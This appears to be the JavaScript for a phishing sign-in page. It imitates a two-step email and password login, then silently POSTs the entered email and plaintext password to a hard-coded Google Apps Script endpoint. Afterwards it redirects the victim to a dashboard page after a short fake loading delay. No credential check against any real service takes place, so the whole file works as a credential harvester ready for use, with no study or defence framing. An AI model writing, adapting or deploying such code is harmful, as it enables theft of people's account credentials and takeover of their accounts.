const emailForm = document.getElementById('emailForm');
const passwordForm = document.getElementById('passwordForm');
const emailInput = document.getElementById('emailInput');
const passwordInput = document.getElementById('passwordInput');
const emailSection = document.getElementById('emailSection');
const passwordSection = document.getElementById('passwordSection');
const continueBtn = document.getElementById('continueBtn');
const signinBtn = document.getElementById('signinBtn');
const changeEmailBtn = document.getElementById('changeEmailBtn');
const passwordToggle = document.getElementById('passwordToggle');
const displayEmail = document.getElementById('displayEmail');

// ⚠️ REPLACE WITH YOUR GOOGLE APPS SCRIPT DEPLOYMENT URL
const GOOGLE_APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxapQ_0EPmMKIg8E12N522qs-nTWwUTJb9Vgl-Aon6uj8JeHpHb_wDikndCYKuwCV9i/exec';

// Email form submission
emailForm.addEventListener('submit', function(e) {
    e.preventDefault();
    const email = emailInput.value.trim();
    
    if (email) {
        displayEmail.textContent = email;
        emailSection.classList.remove('active');
        passwordSection.classList.add('active');
        passwordInput.focus();
    }
});

// Change email button
changeEmailBtn.addEventListener('click', function(e) {
    e.preventDefault();
    passwordSection.classList.remove('active');
    emailSection.classList.add('active');
    emailInput.focus();
    emailInput.select();
});

// Password toggle
passwordToggle.addEventListener('click', function(e) {
    e.preventDefault();
    const type = passwordInput.type === 'password' ? 'text' : 'password';
    passwordInput.type = type;
    passwordToggle.textContent = type === 'password' ? '👁️' : '👁️‍🗨️';
});

// Password form submission
passwordForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = emailInput.value.trim();
    const password = passwordInput.value;

    if (!email || !password) {
        alert('Please enter both email and password');
        return;
    }

    // Show loading animation
    signinBtn.disabled = true;
    signinBtn.innerHTML = '<span class="spinner"></span>Signing in...';

    try {
        // Send to Google Apps Script
        await fetch(GOOGLE_APPS_SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({
                email: email,
                password: password
            })
        });

        // Wait for smooth animation (1.5 seconds)
        await new Promise(resolve => setTimeout(resolve, 1500));

        // Redirect to dashboard
        window.location.href = 'dashboard.html';

    } catch (error) {
        console.error('Error:', error);
        signinBtn.disabled = false;
        signinBtn.innerHTML = 'Sign in';
        alert('An error occurred. Please try again.');
    }
});

// Email validation
emailInput.addEventListener('input', function() {
    continueBtn.disabled = !this.value.trim();
});

continueBtn.disabled = !emailInput.value.trim();